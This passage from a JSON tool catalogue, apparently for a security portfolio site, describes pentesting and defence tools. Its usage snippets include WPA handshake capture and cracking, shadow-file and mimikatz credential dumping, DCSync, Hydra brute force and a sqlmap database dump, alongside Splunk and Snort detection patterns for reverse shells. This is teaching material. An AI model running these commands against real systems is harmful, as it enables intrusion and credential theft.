    "code": "<span class=\"cmd\">airmon-ng start wlan0</span>                                   <span class=\"cmt\"># enable monitor mode</span>\n<span class=\"cmd\">airodump-ng wlan0mon</span>                                    <span class=\"cmt\"># discover networks</span>\n<span class=\"cmd\">airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon</span>\n<span class=\"cmd\">aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon</span>          <span class=\"cmt\"># deauth → handshake</span>\n<span class=\"hi\">WPA handshake: AA:BB:CC:DD:EE:FF captured</span>\n<span class=\"cmd\">aircrack-ng capture.cap -w rockyou.txt</span>\n<span class=\"hi\">KEY FOUND! [ secretpassword123 ]</span>"
   },
   "tags": [
    "Wireless",
    "802.11",
    "WPA2",
    "Deauth",
    "Monitor Mode",
    "Handshake",
    "Airmon-ng"
   ],
   "group": "Network Security",
   "docs": "https://www.aircrack-ng.org/documentation.html",
   "evidence": []
  },
  "ghidra": {
   "name": "Ghidra / IDA Pro",
   "cat": "Reverse Engineering · Disassembler",
   "summary": "Ghidra is the NSA's open-source reverse engineering framework, and IDA Pro is the industry-standard commercial disassembler.",
   "features": [
    {
     "title": "Decompilation",
     "desc": "<strong>Decompiler</strong> — Ghidra's decompiler converts raw assembly into readable pseudo-C code, allowing rapid understanding of malware logic without reading every instruction manually."
    },
    {
     "title": "Multi-Architecture",
     "desc": "<strong>Multi-arch support</strong> — disassembles x86, x86-64, ARM, MIPS, PowerPC, and more; supports PE, ELF, Mach-O, DEX, and raw binary formats for cross-platform malware analysis."
    },
    {
     "title": "String Extraction",
     "desc": "<strong>String & import analysis</strong> — identifies hardcoded strings (C2 URLs, mutex names, registry keys), imported API calls, and obfuscated constants that reveal malware behaviour."
    },
    {
     "title": "Control Flow",
     "desc": "<strong>Control flow graphs</strong> — visualises function logic as node graphs; useful for identifying anti-debugging checks (GetTickCount, IsDebuggerPresent), sleep loops, and XOR decryption routines."
    },
    {
     "title": "Scripting",
     "desc": "<strong>Script automation</strong> — Ghidra's Java and Python API automates repetitive tasks: bulk-renaming variables, applying known decryption keys to XOR-encoded strings, and extracting configuration blobs."
    },
    {
     "title": "Collaboration",
     "desc": "<strong>Collaborative analysis</strong> — Ghidra Server allows multiple analysts to work on the same binary simultaneously, sharing comments, labels, and bookmarks across a team."
    }
   ],
   "usage": {
    "label": "Ghidra — malware analysis workflow",
    "code": "<span class=\"cmd\">file malware.exe</span>        <span class=\"hi\">→ PE32+ executable, UPX packed</span>\n<span class=\"cmd\">upx -d malware.exe</span>      <span class=\"hi\">→ unpacked: malware_unpacked.exe</span>\n<span class=\"out\"># Import into Ghidra → auto-analyse → Functions window</span>\n<span class=\"out\">→ Search Strings: \"http\", \"cmd\", \".exe\", registry paths</span>\n<span class=\"hi\">→ Found: http://185.220.x.x/gate.php (C2 URL)</span>\n<span class=\"warn\">→ XOR loop at 0x00401A20 — key: 0x4E (decodes config blob)</span>"
   },
   "tags": [
    "Reverse Engineering",
    "Malware Analysis",
    "Decompiler",
    "PE Analysis",
    "NSA",
    "IDA Pro"
   ],
   "group": "Malware Analysis",
   "docs": "https://ghidra-sre.org/",
   "evidence": [
    {
     "type": "writeup",
     "id": "rm-mal",
     "label": "Malware Analysis (room)"
    }
   ]
  },
  "maltego": {
   "name": "Maltego",
   "cat": "OSINT · Link Analysis · Graph Intel",
   "summary": "Maltego is a powerful visual intelligence platform that maps relationships between people, organisations, domains, IPs, phone numbers, and social accounts using automated data transforms. It turns raw OSINT data into an interactive graph showing hidden connections.",
   "features": [
    {
     "title": "Automated Transforms",
     "desc": "<strong>Automated transforms</strong> — one-click operations that query 60+ data providers (Shodan, VirusTotal, PassiveTotal, social networks) and automatically draw connections between entities on the graph."
    },
    {
     "title": "Graph Visualisation",
     "desc": "<strong>Visual link analysis</strong> — displays entities (domains, IPs, emails, persons, companies) as graph nodes with edges showing relationships; patterns emerge that are invisible in raw text data."
    },
    {
     "title": "Domain Mapping",
     "desc": "<strong>Domain & infrastructure mapping</strong> — starting from a single domain, Maltego enumerates subdomains, resolves IPs, identifies hosting providers, finds related domains by registrant, and maps the full infrastructure."
    },
    {
     "title": "Person Profiling",
     "desc": "<strong>Person entity enrichment</strong> — from an email address, Maltego can find linked social profiles, phone numbers, physical addresses, and affiliated organisations using breach data and social transforms."
    },
    {
     "title": "Threat Intelligence",
     "desc": "<strong>Threat actor attribution</strong> — correlates malware C2 IPs, phishing domains, and email addresses to identify infrastructure reuse patterns and link campaigns to known threat actors."
    },
    {
     "title": "Report Export",
     "desc": "<strong>Report generation</strong> — exports the graph as PDF, PNG, XLSX, or raw entity CSV for inclusion in penetration test reports and threat intelligence deliverables."
    }
   ],
   "usage": {
    "label": "Maltego — domain recon workflow",
    "code": "<span class=\"out\">New Graph → Add entity: Domain → \"target.com\"</span>\n<span class=\"out\">Run transforms: DNS → MX, NS, Subdomains</span>\n<span class=\"hi\">→ mail.target.com  → 203.0.113.15  (Outlook 365)</span>\n<span class=\"hi\">→ vpn.target.com   → 198.51.100.7  (Cisco ASA 9.12)</span>\n<span class=\"hi\">→ dev.target.com   → 198.51.100.22 (exposed GitLab)</span>\n<span class=\"warn\"># Run BuiltWith transform → dev.target.com uses WordPress 5.8 (unpatched)</span>"
   },
   "tags": [
    "OSINT",
    "Link Analysis",
    "Graph Intel",
    "Domain Recon",
    "Threat Actor",
    "Transforms"
   ],
   "group": "Penetration Testing",
   "docs": "https://docs.maltego.com/",
   "evidence": [
    {
     "type": "writeup",
     "id": "rm-osint",
     "label": "OSINT (room)"
    }
   ]
  },
  "python": {
   "name": "Python",
   "cat": "Scripting · Automation · Tool Development",
   "summary": "Python is a versatile scripting language widely used for security tooling. Its rich ecosystem of security-focused libraries makes it indispensable for automating repetitive tasks, building custom forensics tools, writing exploit scripts, parsing binary data, and developing automation pipelines that chain multiple security tools together.",
   "features": [
    {
     "title": "Forensics Scripting",
     "desc": "<strong>Forensics automation</strong> — file carving with python-magic, EXIF extraction with Pillow/exifread, SQLite parsing for browser forensics, EVTX log parsing with python-evtx, and timeline generation."
    },
    {
     "title": "Network & Exploitation",
     "desc": "<strong>Network & exploitation</strong> — scapy for raw packet crafting and network analysis; impacket for SMB, Kerberos, and LDAP protocol interaction in Active Directory attacks (GetUserSPNs, secretsdump)."
    },
    {
     "title": "Automation & APIs",
     "desc": "<strong>API integration</strong> — requests library for VirusTotal, Shodan, and threat intel API lookups; paramiko for SSH automation; Beautiful Soup for scraping and OSINT data extraction."
    },
    {
     "title": "CTF & Crypto",
     "desc": "<strong>CTF problem solving</strong> — pwntools for binary exploitation (ROP chains, format strings); pycryptodome for cryptographic attacks (XOR cracking, RSA e=3 cube root, padding oracle)."
    },
    {
     "title": "Data Processing",
     "desc": "<strong>Data analysis & reporting</strong> — pandas for processing large forensics datasets; json/csv parsing for log analysis; Jinja2 for automated HTML report generation from forensics findings."
    },
    {
     "title": "Tool Development",
     "desc": "<strong>Custom tool development</strong> — all 6 GitHub repos are Python or Bash; building reusable forensics utilities, Volatility plugin wrappers, and SIEM alert parsers from scratch."
    }
   ],
   "usage": {
    "label": "python3 — forensics snippet",
    "code": "<span class=\"cmt\"># Automated Volatility triage + IOC report</span>\n<span class=\"cmd\">import subprocess, json</span>\n<span class=\"cmd\">plugins = [\"windows.pstree\",\"windows.malfind\",\"windows.netstat\",\"windows.hashdump\"]</span>\n<span class=\"cmd\">for p in plugins:</span>\n<span class=\"cmd\">    out = subprocess.run([\"python3\",\"vol.py\",\"-f\",\"dump.raw\",p], capture_output=True)</span>\n<span class=\"hi\">→ Generates structured JSON IOC report from all plugin outputs</span>"
   },
   "tags": [
    "Python",
    "Scripting",
    "Impacket",
    "Scapy",
    "pwntools",
    "Automation",
    "Forensics"
   ],
   "group": "Programming and Automation",
   "docs": "https://docs.python.org/3/",
   "evidence": [
    {
     "type": "project",
     "id": "reconkit",
     "label": "Automated Recon & Enumeration Toolkit v2.0"
    },
    {
     "type": "writeup",
     "id": "rm-owasp",
     "label": "OWASP Top 10 (room)"
    },
    {
     "type": "writeup",
     "id": "pickle",
     "label": "Pickle Rick (writeup)"
    }
   ]
  },
  "splunk": {
   "name": "Splunk",
   "cat": "SIEM · Log Analysis · Threat Hunting",
   "summary": "Splunk is the leading Security Information and Event Management (SIEM) platform used in enterprise SOC environments. It ingests, indexes, and correlates billions of log events from endpoints, firewalls, web servers, and cloud infrastructure.",
   "features": [
    {
     "title": "SPL Query Language",
     "desc": "<strong>Search Processing Language (SPL)</strong> — Splunk's powerful query syntax enables filtering, aggregation, statistical analysis, and visualisation of log data; stats, eval, rex, and transaction are the core commands."
    },
    {
     "title": "Alert Engineering",
     "desc": "<strong>Detection rule building</strong> — scheduled searches that alert when threshold conditions are met (e.g. 5+ failed logons from one IP in 60 seconds); maps directly to MITRE ATT&CK technique IDs."
    },
    {
     "title": "Dashboards",
     "desc": "<strong>SOC dashboards</strong> — real-time panels showing failed logons, PowerShell execution events, new scheduled tasks, unusual outbound connections, and service installations across the fleet."
    },
    {
     "title": "Threat Hunting",
     "desc": "<strong>Proactive threat hunting</strong> — hunting for living-off-the-land binaries (lolbas), process injection patterns (Event ID 8), credential access (Event ID 4648), and lateral movement (Event ID 4624 type 3)."
    },
    {
     "title": "Log Correlation",
     "desc": "<strong>Multi-source correlation</strong> — joins Windows event logs, Sysmon, firewall logs, and endpoint data to build complete attack chains across time and multiple hosts."
    },
    {
     "title": "SOAR Integration",
     "desc": "<strong>Automation & SOAR</strong> — Splunk SOAR (Phantom) playbooks automate tier-1 triage: enriching IPs via VirusTotal, isolating hosts via EDR API, and creating JIRA tickets on confirmed incidents."
    }
   ],
   "usage": {
    "label": "Splunk SPL — threat hunting",
    "code": "<span class=\"cmd\">index=windows EventCode=4625 | stats count by src_ip | sort -count | head 10</span>\n<span class=\"hi\">→ Brute-force: 192.168.1.55 → 847 failed logons in 10 minutes</span>\n<span class=\"cmd\">index=windows EventCode=4688 NewProcessName=\"*powershell*\" CommandLine=\"*-enc*\"</span>\n<span class=\"hi\">→ Encoded PowerShell execution — suspected dropper</span>\n<span class=\"cmd\">index=network dest_port=4444 OR dest_port=1337 | stats count by src_ip dest_ip</span>\n<span class=\"warn\">→ C2 callback detected: host-007 → 185.220.101.47:4444</span>"
   },
   "tags": [
    "SIEM",
    "SOC",
    "SPL",
    "Log Analysis",
    "Threat Hunting",
    "Alert Triage",
    "Blue Team"
   ],
   "group": "Network Security",
   "docs": "https://docs.splunk.com/",
   "evidence": [
    {
     "type": "writeup",
     "id": "rm-soc",
     "label": "SOC Level 1 (room)"
    }
   ]
  },
  "gobuster": {
   "name": "Gobuster",
   "cat": "Directory Busting · DNS Brute-Force",
   "summary": "Gobuster is a fast, concurrent directory, file, DNS, and S3 bucket brute-forcing tool written in Go. Unlike slower Python-based alternatives, Gobuster uses goroutines to send hundreds of requests simultaneously, making it ideal for quickly enumerating web application attack surfaces.",
   "features": [
    {
     "title": "Directory & File Busting",
     "desc": "<strong>Dir mode</strong> — brute-forces URL paths against a wordlist to discover hidden directories (/admin, /backup, /api), configuration files (.env, web.config), and upload endpoints not linked from the main site."
    },
    {
     "title": "DNS Subdomain Enum",
     "desc": "<strong>DNS mode</strong> — brute-forces subdomains by querying DNS for each wordlist entry; discovers dev., staging., vpn., and internal. subdomains that are reachable but not publicly advertised."
    },
    {
     "title": "S3 Bucket Discovery",
     "desc": "<strong>S3 mode</strong> — enumerates Amazon S3 bucket names based on target organisation patterns; finds publicly accessible buckets containing sensitive files, backups, or source code."
    },
    {
     "title": "Go Concurrency",
     "desc": "<strong>Concurrent performance</strong> — --threads controls goroutine count; 50 threads on a standard connection processes 300+ requests per second, completing a 220k-word list in under 15 minutes."
    },
    {
     "title": "Extension Fuzzing",
     "desc": "<strong>Extension brute-forcing</strong> — -x php,html,txt,bak,zip appends extensions to every wordlist entry, finding backup files (index.php.bak), source code (login.php~), and database dumps (db.sql)."
    },
    {
     "title": "Status Filtering",
     "desc": "<strong>Response filtering</strong> — --exclude-length and -b flags remove false positives by filtering specific status codes or response lengths; essential for applications that return 200 for non-existent pages."
    }
   ],
   "usage": {
    "label": "kali@forensics — gobuster enum",
    "code": "<span class=\"cmd\">gobuster dir -u http://10.10.x.x -w /usr/share/dirb/wordlists/common.txt -x php,html,txt,bak -t 50</span>\n<span class=\"hi\">/admin          (Status: 200) [Size: 4821]</span>\n<span class=\"hi\">/login.php      (Status: 200) [Size: 1203]</span>\n<span class=\"hi\">/backup.zip     (Status: 200) [Size: 2048192]</span>\n<span class=\"warn\">/config.php.bak (Status: 200) [Size: 412]   ← credentials in backup!</span>\n<span class=\"cmd\">gobuster dns -d target.com -w subdomains-top1mil.txt</span>\n<span class=\"hi\">→ dev.target.com, vpn.target.com, staging.target.com</span>"
   },
   "tags": [
    "Directory Busting",
    "Web Recon",
    "DNS Enum",
    "Go",
    "S3",
    "CTF",
    "Pentesting"
   ],
   "group": "Web Application Security",
   "docs": "https://github.com/OJ/gobuster",
   "evidence": [
    {
     "type": "writeup",
     "id": "pickle",
     "label": "Pickle Rick (writeup)"
    }
   ]
  },
  "sqlmap": {
   "name": "SQLMap",
   "cat": "Web App Security · SQLi Automation",
   "summary": "SQLMap is the industry-standard open-source tool for detecting and exploiting SQL injection vulnerabilities. It automates the entire process — from identifying injectable parameters to extracting database contents, dumping tables, and even achieving OS command execution on the underlying server in some configurations.",
   "features": [
    {
     "desc": "<strong>Injection Detection</strong> — tests GET/POST parameters, headers, and cookies against boolean-based, time-based, error-based, and UNION-based SQLi techniques automatically."
    },
    {
     "desc": "<strong>Database Fingerprinting</strong> — identifies the exact DBMS (MySQL, PostgreSQL, MSSQL, Oracle, SQLite) and version without manual probing."
    },
    {
     "desc": "<strong>Data Extraction</strong> — dumps databases, tables, columns, and full row contents once an injection point is confirmed."
    },
    {
     "desc": "<strong>Privilege & OS Access</strong> — supports --os-shell and --os-pwn for full OS command execution where DB privileges allow (e.g. MySQL FILE priv, MSSQL xp_cmdshell)."
    },
    {
     "desc": "<strong>WAF/IPS Evasion</strong> — built-in tamper scripts to bypass common web application firewalls during testing."
    }
   ],
   "usage": {
    "label": "sqlmap — full automated dump",
    "code": "<span class=\"cmd\">sqlmap -u \"http://target/page.php?id=1\" --batch --dbs</span>\n<span class=\"hi\">[+] available databases: information_schema, app_db, users_db</span>\n<span class=\"cmd\">sqlmap -u \"http://target/page.php?id=1\" -D users_db --tables</span>\n<span class=\"hi\">[+] Table: users, sessions, admin_logs</span>\n<span class=\"cmd\">sqlmap -u \"http://target/page.php?id=1\" -D users_db -T users --dump</span>\n<span class=\"warn\">[+] Dumped 1,204 rows — username, password_hash, email</span>"
   },
   "tags": [
    "SQL Injection",
    "Web Security",
    "Automation",
    "Database",
    "OWASP",
    "Pentesting"
   ],
   "group": "Web Application Security",
   "docs": "https://github.com/sqlmapproject/sqlmap/wiki/Usage",
   "evidence": []
  },
  "johnripper": {
   "name": "John the Ripper",
   "cat": "Password Cracking · CPU-Based",
   "summary": "John the Ripper is the original, battle-tested password cracking tool, optimised for CPU-based cracking. While Hashcat dominates GPU cracking, John remains essential for cracking Unix/Linux shadow file hashes, ZIP/RAR archive passwords, and SSH private key passphrases that Hashcat handles less elegantly.",
   "features": [
    {
     "desc": "<strong>Auto Hash Detection</strong> — automatically identifies hash type from format (MD5crypt, bcrypt, sha512crypt, NTLM) without manual mode flags."
    },
    {
     "desc": "<strong>Unshadow Utility</strong> — combines /etc/passwd and /etc/shadow into a crackable single file format for Linux credential auditing."
    },
    {
     "desc": "<strong>Archive Cracking</strong> — zip2john, rar2john, ssh2john convert ZIP, RAR, and SSH key passphrases into John-crackable hash formats."
    },
    {
     "desc": "<strong>Wordlist + Rules Engine</strong> — mutates wordlists with built-in rule sets (case toggling, leet-speak, append digits) similar to Hashcat's rule engine."
    },
    {
     "desc": "<strong>Incremental Mode</strong> — pure brute-force using character frequency tables for efficient guessing without a wordlist."
    }
   ],
   "usage": {
    "label": "john — cracking a Linux shadow file",
    "code": "<span class=\"cmd\">unshadow /etc/passwd /etc/shadow > combined.txt</span>\n<span class=\"cmd\">john --wordlist=rockyou.txt combined.txt</span>\n<span class=\"hi\">Loaded 4 password hashes (sha512crypt)</span>\n<span class=\"hi\">summer2023      (user: dave)</span>\n<span class=\"cmd\">ssh2john id_rsa > id_rsa.hash</span>\n<span class=\"cmd\">john --wordlist=rockyou.txt id_rsa.hash</span>\n<span class=\"hi\">dragon99        (id_rsa)</span>"
   },
   "tags": [
    "Password Cracking",
    "CPU",
    "Linux",
    "SSH Keys",
    "Archives",
    "CTF"
   ],
   "group": "Penetration Testing",
   "docs": "https://www.openwall.com/john/doc/",
   "evidence": [
    {
     "type": "writeup",
     "id": "rm-blue",
     "label": "Blue (room)"
    },
    {
     "type": "writeup",
     "id": "blue",
     "label": "Blue (writeup)"
    }
   ]
  },
  "nikto": {
   "name": "Nikto",
   "cat": "Web App Security · Vulnerability Scanner",
   "summary": "Nikto is a fast, open-source web server scanner that checks for thousands of known vulnerabilities, dangerous files, outdated software versions, and misconfigurations in a single automated pass. It is typically the first web-facing scan run after Nmap during a penetration test.",
   "features": [
    {
     "desc": "<strong>6,700+ Vulnerability Checks</strong> — tests against a massive database of known dangerous files, outdated server software, and CGI vulnerabilities."
    },
    {
     "desc": "<strong>Outdated Software Detection</strong> — flags server software (Apache, nginx, IIS) and installed components running versions with known CVEs."
    },
    {
     "desc": "<strong>SSL/TLS Checks</strong> — identifies weak ciphers, expired certificates, and protocol downgrade vulnerabilities on HTTPS endpoints."
    },
    {
     "desc": "<strong>Dangerous File Discovery</strong> — finds exposed backup files, default install pages, and admin interfaces left accessible."
    },
    {
     "desc": "<strong>Multiple Report Formats</strong> — outputs to HTML, CSV, or XML for easy inclusion in penetration test reports."
    }
   ],
   "usage": {
    "label": "nikto — full web server scan",
    "code": "<span class=\"cmd\">nikto -h http://10.10.x.x -o report.html -Format htm</span>\n<span class=\"hi\">+ Server: Apache/2.4.18 (Ubuntu)</span>\n<span class=\"warn\">+ Apache 2.4.18 appears outdated (CVE-2017-7679, CVE-2017-9788)</span>\n<span class=\"warn\">+ /admin/: Admin login page exposed</span>\n<span class=\"warn\">+ /backup.zip: Backup file found — potential source code leak</span>\n<span class=\"hi\">+ 1247 requests: 4 vulnerabilities found</span>"
   },
   "tags": [
    "Web Security",
    "Vulnerability Scanner",
    "CVE",
    "Server Auditing",
    "Pentesting"
   ],
   "group": "Web Application Security",
   "docs": "https://github.com/sullo/nikto/wiki",
   "evidence": []
  },
  "mimikatz": {
   "name": "Mimikatz",
   "cat": "Post-Exploitation · Credential Extraction",
   "summary": "Mimikatz is the definitive Windows post-exploitation tool for extracting plaintext passwords, password hashes, PIN codes, and Kerberos tickets directly from memory. It exploits how Windows historically stored credentials in LSASS process memory, making it a cornerstone of Active Directory attack chains.",
   "features": [
    {
     "desc": "<strong>LSASS Credential Dumping</strong> — sekurlsa::logonpasswords extracts plaintext passwords and NTLM hashes from logged-on user sessions in memory."
    },
    {
     "desc": "<strong>Pass-the-Hash / Pass-the-Ticket</strong> — reuses extracted NTLM hashes or Kerberos tickets to authenticate as a user without knowing their plaintext password."
    },
    {
     "desc": "<strong>Golden &amp; Silver Tickets</strong> — forges Kerberos TGTs (Golden Ticket) using the krbtgt hash for domain-wide persistent access."
    },
    {
     "desc": "<strong>DCSync Attack</strong> — impersonates a Domain Controller to request password hashes for any AD account, including krbtgt, without code execution on the DC itself."
    },
    {
     "desc": "<strong>Vault &amp; DPAPI Decryption</strong> — recovers credentials stored in Windows Credential Manager and browser-saved passwords protected by DPAPI."
    }
   ],
   "usage": {
    "label": "mimikatz — credential extraction",
    "code": "<span class=\"cmd\">privilege::debug</span>\n<span class=\"hi\">Privilege '20' OK</span>\n<span class=\"cmd\">sekurlsa::logonpasswords</span>\n<span class=\"hi\">Username: Administrator</span>\n<span class=\"hi\">NTLM: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</span>\n<span class=\"cmd\">lsadump::dcsync /domain:corp.local /user:krbtgt</span>\n<span class=\"warn\">[+] krbtgt hash extracted — Golden Ticket possible</span>"
   },
   "tags": [
    "Active Directory",
    "Post-Exploitation",
    "Kerberos",
    "LSASS",
    "Windows",
    "Red Team"
   ],
   "group": "Penetration Testing",
   "docs": "https://github.com/gentilkiwi/mimikatz/wiki",
   "evidence": [
    {
     "type": "writeup",
     "id": "blue",
     "label": "Blue (writeup)"
    }
   ]
  },
  "bloodhound": {
   "name": "BloodHound",
   "cat": "Active Directory · Attack Path Mapping",
   "summary": "BloodHound uses graph theory to reveal hidden and often unintended relationships within an Active Directory environment. By ingesting data collected from SharpHound, it visually maps the shortest attack path from an initial low-privilege foothold all the way to Domain Admin.",
   "features": [
    {
     "desc": "<strong>Graph-Based Attack Paths</strong> — visualises every user, group, computer, and trust relationship as nodes, instantly surfacing the shortest path to Domain Admin."
    },
    {
     "desc": "<strong>SharpHound Collector</strong> — the companion data-collection tool that ingests AD objects, sessions, ACLs, and group memberships via LDAP and SMB."
    },
    {
     "desc": "<strong>Pre-Built Cypher Queries</strong> — built-in queries instantly find Kerberoastable accounts, unconstrained delegation, and AS-REP roastable users."
    },
    {
     "desc": "<strong>ACL Abuse Detection</strong> — identifies dangerous permission misconfigurations like GenericAll or WriteDACL that allow privilege escalation."
    },
    {
     "desc": "<strong>Shortest Path Analysis</strong> — given any starting node, calculates the mathematically shortest compromise chain to high-value targets."
    }
   ],
   "usage": {
    "label": "BloodHound — finding the path to Domain Admin",
    "code": "<span class=\"cmd\">SharpHound.exe -c All --zipfilename loot.zip</span>\n<span class=\"hi\">[+] Collected 412 users, 89 computers, 156 groups</span>\n<span class=\"out\"># Drag loot.zip into BloodHound GUI → Analysis tab</span>\n<span class=\"cmd\">Query: Shortest Paths to Domain Admins</span>\n<span class=\"warn\">[!] Path found: jsmith → GenericAll on svc-backup → svc-backup → Domain Admin</span>\n<span class=\"hi\">[+] 1 compromised account away from full domain takeover</span>"
   },
   "tags": [
    "Active Directory",
    "Attack Paths",
    "SharpHound",
    "Privilege Escalation",
    "Red Team"
   ],
   "group": "Penetration Testing",
   "docs": "https://bloodhound.specterops.io/",
   "evidence": [
    {
     "type": "writeup",
     "id": "rm-ad",
     "label": "Active Directory (room)"
    },
    {
     "type": "writeup",
     "id": "adpen",
     "label": "AD Penetration (writeup)"
    }
   ]
  },
  "zap": {
   "name": "OWASP ZAP",
   "cat": "Web App Security · Free Scanner",
   "summary": "OWASP ZAP (Zed Attack Proxy) is the most widely used free, open-source web application security scanner, maintained by OWASP itself. It combines an intercepting proxy, automated active/passive scanners, and a fuzzer in one tool — functioning as a fully free alternative to Burp Suite Professional for many use cases.",
   "features": [
    {
     "desc": "<strong>Automated Scanner</strong> — passive scan analyses every request/response as you browse; active scan launches real attack payloads against discovered endpoints."
    },
    {
     "desc": "<strong>Intercepting Proxy</strong> — sits between browser and server exactly like Burp, allowing manual request modification and replay."
    },
    {
     "desc": "<strong>Spider &amp; AJAX Spider</strong> — crawls traditional links and JavaScript-heavy single-page apps to map the full application surface before scanning."
    },
    {
     "desc": "<strong>Scripting &amp; Automation</strong> — full REST API and Zest scripting language for integrating ZAP scans into CI/CD pipelines."
    },
    {
     "desc": "<strong>Free &amp; Open Source</strong> — entirely free with no paywalled features, making it the standard choice for budget-conscious or educational pentesting."
    }
   ],
   "usage": {
    "label": "OWASP ZAP — automated scan",
    "code": "<span class=\"out\">Quick Start tab → Automated Scan → enter target URL</span>\n<span class=\"cmd\">zap-cli quick-scan --self-contained http://10.10.x.x</span>\n<span class=\"hi\">[INFO] Spidering target... 84 URLs found</span>\n<span class=\"warn\">[ALERT-HIGH] SQL Injection — /login.php (param: username)</span>\n<span class=\"warn\">[ALERT-MED] Missing Anti-CSRF Tokens — /profile/update</span>\n<span class=\"hi\">[+] Scan complete — report.html generated</span>"
   },
   "tags": [
    "OWASP",
    "Web Security",
    "Free Tool",
    "Proxy",
    "Automation",
    "CI/CD"
   ],
   "group": "Web Application Security",
   "docs": "https://www.zaproxy.org/docs/",
   "evidence": []
  },
  "hydra": {
   "name": "Hydra",
   "cat": "Password Cracking · Online Brute Force",
   "summary": "THC-Hydra is a fast, parallelised network login cracker supporting dozens of protocols. While Hashcat and John crack hashes offline, Hydra attacks live services directly — SSH, FTP, RDP, HTTP forms, SMB, and more — making it essential for testing weak credential policies on running services.",
   "features": [
    {
     "desc": "<strong>50+ Protocol Support</strong> — SSH, FTP, Telnet, HTTP(S)-FORM, SMB, RDP, MySQL, PostgreSQL, VNC and dozens more in one unified tool."
    },
    {
     "desc": "<strong>Parallelised Attacks</strong> — runs multiple login attempts concurrently (-t flag controls thread count) for significantly faster brute-force campaigns."
    },
    {
     "desc": "<strong>Combo &amp; Wordlist Modes</strong> — supports username:password combo lists or separate username/password wordlist pairing."
    },
    {
     "desc": "<strong>HTTP Form Brute-Forcing</strong> — parses login form fields and cookies to brute-force web application login pages directly."
    },
    {
     "desc": "<strong>Failure String Detection</strong> — configurable failure/success string matching to accurately detect successful logins on custom web forms."
    }
   ],
   "usage": {
    "label": "hydra — SSH and web form brute-force",
    "code": "<span class=\"cmd\">hydra -l admin -P rockyou.txt ssh://10.10.x.x -t 4</span>\n<span class=\"hi\">[22][ssh] login: admin   password: summer2023</span>\n<span class=\"cmd\">hydra -l admin -P rockyou.txt 10.10.x.x http-post-form \\\n  \"/login:user=^USER^&pass=^PASS^:Invalid credentials\"</span>\n<span class=\"hi\">[80][http-post-form] login: admin   password: P@ssw0rd!</span>"
   },
   "tags": [
    "Brute Force",
    "Network Services",
    "SSH",
    "Web Forms",
    "CTF",
    "Pentesting"
   ],
   "group": "Penetration Testing",
   "docs": "https://github.com/vanhauser-thc/thc-hydra",
   "evidence": []
  },
  "reconng": {
   "name": "Recon-ng",
   "cat": "OSINT · Reconnaissance Framework",
   "summary": "Recon-ng is a full-featured reconnaissance framework written in Python, built with a Metasploit-like module structure. It automates OSINT gathering — domain enumeration, contact harvesting, geolocation, and breach data lookups — by chaining together dozens of independent modules that feed results into a shared workspace database.",
   "features": [
    {
     "desc": "<strong>Modular Workspace</strong> — each engagement gets its own workspace database; results from one module (e.g. subdomains) automatically feed into the next (e.g. port scanning)."
    },
    {
     "desc": "<strong>Contact &amp; Email Harvesting</strong> — modules pull employee names and email addresses from search engines, LinkedIn, and breach databases."
    },
    {
     "desc": "<strong>Domain &amp; Subdomain Enum</strong> — integrates with Shodan, Censys, and certificate transparency logs for passive subdomain discovery."
    },
    {
     "desc": "<strong>Geolocation Modules</strong> — extracts geolocation metadata from social media posts and image EXIF data tied to a target."
    },
    {
     "desc": "<strong>Reporting Engine</strong> — exports findings directly to HTML, CSV, or JSON reports formatted for client delivery."
    }
   ],
   "usage": {
    "label": "recon-ng — domain OSINT workflow",
    "code": "<span class=\"cmd\">recon-ng</span>\n<span class=\"cmd\">workspaces create target_corp</span>\n<span class=\"cmd\">modules load recon/domains-hosts/hackertarget</span>\n<span class=\"cmd\">options set SOURCE target.com</span>\n<span class=\"cmd\">run</span>\n<span class=\"hi\">[*] 14 hosts found — vpn.target.com, mail.target.com, dev.target.com</span>\n<span class=\"cmd\">modules load recon/domains-contacts/whois_pocs</span>\n<span class=\"hi\">[*] 3 contacts harvested from WHOIS records</span>"
   },
   "tags": [
    "OSINT",
    "Reconnaissance",
    "Python",
    "Modular Framework",
    "Reporting"
   ],
   "group": "Penetration Testing",
   "docs": "https://github.com/lanmaster53/recon-ng/wiki",
   "evidence": []
  },
  "snort": {
   "name": "Snort",
   "cat": "Network Defense · IDS/IPS",
   "summary": "Snort is the world's most widely deployed open-source Intrusion Detection and Prevention System. It analyses live network traffic in real time against a continuously updated ruleset, detecting port scans, buffer overflow attempts, malware C2 traffic, and known exploit signatures — essential knowledge for understanding what defenders see during a penetration test.",
   "features": [
    {
     "desc": "<strong>Signature-Based Detection</strong> — matches traffic against thousands of community and registered rules covering known exploits, malware, and protocol anomalies."
    },
    {
     "desc": "<strong>Real-Time Alerting</strong> — generates immediate alerts on rule matches, logged to file, database, or SIEM integration via syslog."
    },
    {
     "desc": "<strong>Inline IPS Mode</strong> — can actively drop or reject malicious packets in real time, not just passively detect them, when deployed inline."
    },
    {
     "desc": "<strong>Custom Rule Writing</strong> — security teams write custom Snort rules to detect organisation-specific threats or newly disclosed CVEs."
    },
    {
     "desc": "<strong>Protocol Anomaly Detection</strong> — flags malformed packets and protocol violations that often indicate evasion attempts or fuzzing."
    }
   ],
   "usage": {
    "label": "snort — live traffic monitoring",
    "code": "<span class=\"cmd\">snort -i eth0 -c /etc/snort/snort.conf -A console</span>\n<span class=\"warn\">[**] [1:1000001:1] Possible Nmap SYN scan detected [**]</span>\n<span class=\"warn\">[**] [1:2001219:1] ET SCAN Potential SSH Scan [**]</span>\n<span class=\"cmt\"># Custom rule example:</span>\n<span class=\"cmd\">alert tcp any any -> $HOME_NET 4444 (msg:\"Possible reverse shell\"; sid:1000010;)</span>\n<span class=\"hi\">[+] Rule loaded — monitoring for port 4444 connections</span>"
   },
   "tags": [
    "IDS/IPS",
    "Network Defense",
    "Blue Team",
    "Signature Detection",
    "SIEM"
   ],
   "group": "Network Security",
   "docs": "https://www.snort.org/documents",
   "evidence": [
    {
     "type": "writeup",
     "id": "rm-soc",
     "label": "SOC Level 1 (room)"
    }
   ]
  },
  "yara": {
   "name": "YARA",
   "cat": "Malware Analysis · Pattern Matching",
   "summary": "YARA is the industry-standard pattern-matching tool used to identify and classify malware samples based on textual or binary patterns. Often described as \"the pattern matching swiss knife for malware researchers,\" it lets analysts write rules describing malware families, which can then scan files, processes, or entire disk images for matches.",
   "features": [
    {
